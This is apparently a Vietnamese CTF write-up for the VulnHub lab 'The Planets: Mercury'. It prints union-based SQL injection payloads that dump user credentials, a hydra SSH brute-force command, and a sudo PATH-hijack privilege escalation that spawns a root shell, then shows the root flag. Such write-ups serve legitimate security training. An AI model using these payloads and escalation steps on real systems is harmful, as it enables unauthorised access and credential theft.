---
title: "The Planets: Mercury Writeup - VulnHub"
categories:
  - CTF Writeup
  - VulnHub
tags:
  - hacking
  - The Planets
render_with_liquid: false
date: "2023-07-22 20:25:45"
---

Download [THE PLANETS: MERCURY](https://www.vulnhub.com/entry/the-planets-mercury,544/){:target="\_blank"}

**Level**: Easy

## Scanning

<br>
Sử dụng **arp-scan** để xác định ip máy chủ mục tiêu

![scan ip](/assets/img/posts/mercury-walkthrough/scan-ip.png)

Sau khi xác định được ip, tiến hành scan các port dịch vụ. Thử scan các known port trước cho đỡ tốn thời gian

![scan port](/assets/img/posts/mercury-walkthrough/scan-port.png)

Thấy được 2 services đang hoạt động, ssh port 22 và web server port 8080. Thử truy cập webpage `http://10.0.2.4:8080`
xem khám phá được gì không

![run website](/assets/img/posts/mercury-walkthrough/website.PNG)

Response trả về là 1 thông báo rằng site đang trong quá trình phát triển, ta có thể đoán có 1 hoặc 1 số ứng dụng web đang chạy trên máy mục tiêu. Tiến hành enumerate files phổ biến, có thể sử dụng tools `dirb`, `dirsearch`, `gobuster`, ...

![enumerate files](/assets/img/posts/mercury-walkthrough/enumerate-files.PNG)

Truy cập `/robots.txt` cũng không có manh mối gì. Nhưng may mắn thay, trong khi mình thử random 1 số file thì nó hiển thị ra 1 số errors do dev quên không tắt tính năng debug :))

![enumerate files](/assets/img/posts/mercury-walkthrough/clue.PNG)

Phát hiện được có tồn tại một folder `mercuryfacts/`. Truy cập nó và xem nó có gì

![mercuryfacts](/assets/img/posts/mercury-walkthrough/mercuryfacts.PNG)

![load a fact](/assets/img/posts/mercury-walkthrough/load-a-fact.PNG)

Ở đây có xuất hiện 2 link, Truy cập <u>Load a fact</u> thì trang này có chứa dữ liệu trả về theo id từ url, khả năng gọi từ database nên mình test thử sql injection bằng cách chèn nháy đơn:

![sql error](/assets/img/posts/mercury-walkthrough/sql-error.PNG)

Không còn nghi ngờ gì nữa, site này dính SQLi và trang debug hiển thị lỗi sql, cho thấy rằng payload của ta được chấp nhận để truy vấn vào database. Hơn thế nữa, dựa vào syntax error xác định được Union-based SQLi. Mở Burp và tiến hành khai thác.
<br>

## Exploitation

Thử câu truy vấn "thần thánh" `or 1=1` để bắt đầu khai thác:

```plaintext
/mercuryfacts/1 or 1=1
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-1.PNG)

Đúng như mong đợi, kết quả là đã dump được tất cả các row trong sự kiện này (À, trước khi gửi request thì url-encode đã nhé!)
<br>

Tiếp tục với câu lệnh UNION, tiến hành exploit tên database

```
/mercuryfacts/1 union select database()
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-3.PNG)

Tìm tên các bảng từ database đã tìm được, tham chiếu từ `information_schema`.

```
/mercuryfacts/1 union select group_concat(table_name) from information_schema.tables where table_schema='mercury'/
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-4.PNG)

Có 2 bảng được trích xuất, nhưng chỉ cần quan tâm đến bảng `users`.

```
/mercuryfacts/1 union select group_concat(column_name) from information_schema.columns where table_schema='mercury' and table_name='users'/
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-5.PNG)

Lần lượt dump username và password.

```
/mercuryfacts/1 union select group_concat(username) from users/
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-6.PNG)

```
/mercuryfacts/1 union select group_concat(password) from users/
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-7.PNG)

Nhớ ra rằng ssh đang chạy cổng 22. Quá là lười thử từng username và password nên mình sẽ lựa chọn `hydra` để tổ hợp từng username password và login vô ssh.

```shell
hydra -L username.txt -P password.txt ssh://10.0.2.4 -V
```

![exploit](/assets/img/posts/mercury-walkthrough/exploit-8.PNG)

Kết quả có 2 combination (nhưng là vì lab này đã được custom lại nên có thêm user `cmcleuleu`, còn bản gốc thì user_flag nằm ngay trong user `webmaster`). Tiến hành login user `cmcleuleu` và get user flag.

![user flag](/assets/img/posts/mercury-walkthrough/user_flag.PNG)

Switch user qua `webmaster` và thực hiện Privilege Escalation.

## Privilege Escalation

Khám phá một lúc thì phát hiện được có 1 secret notes nằm trong thư mục dự án

![secret notes](/assets/img/posts/mercury-walkthrough/secret_notes.PNG)

Decode base64 ta nhận được password của `linuxmaster`, su `linuxmaster` và tìm kiếm root flag

![linuxmaster user](/assets/img/posts/mercury-walkthrough/linuxmaster.PNG)

Kiểm tra đặc quyền của _linuxmaster_ thông qua `sudo -l`

![linuxmaster privilege](/assets/img/posts/mercury-walkthrough/linuxmaster-privilege.PNG)

Có thể thấy, user có thể thực thi script `/usr/bin/check_syslog.sh` với quyền _root_ và lại được set preserved environment. Kiểm tra xem file `check_syslog.sh` có gì:

![check_syslog.sh](/assets/img/posts/mercury-walkthrough/check_syslog.PNG)

User không có quyền ghi file `check_syslog.sh` nhưng có thể thực thi nó, hơn thế nữa trong shell script có chứa lệnh `tail` được gọi. Ý tưởng là ghi đè lệnh tail để gọi shell cùng với đó là chạy dưới quyền root.

```shell
linuxmaster@cmclabs1:~$ echo "/bin/bash" > tail
linuxmaster@cmclabs1:~$ chmod 777 tail
linuxmaster@cmclabs1:~$ export PATH=$(pwd):$PATH
```

Cuối cùng, thực thi script `check_syslog.sh` dưới chế độ _preserved environment_ cho PATH:

```shell
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

bÙm...

```shell
root@cmclabs1:/home/linuxmaster# cd /root
root@cmclabs1:~# ls
root_flag.txt
root@cmclabs1:~# cat *
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations!!!
If you have any feedback please contact me at autosys@cmcinfosec.com
[root_cmcsoc_flag_1a7e3807f7122beb1527b54d6b46aad3]
```
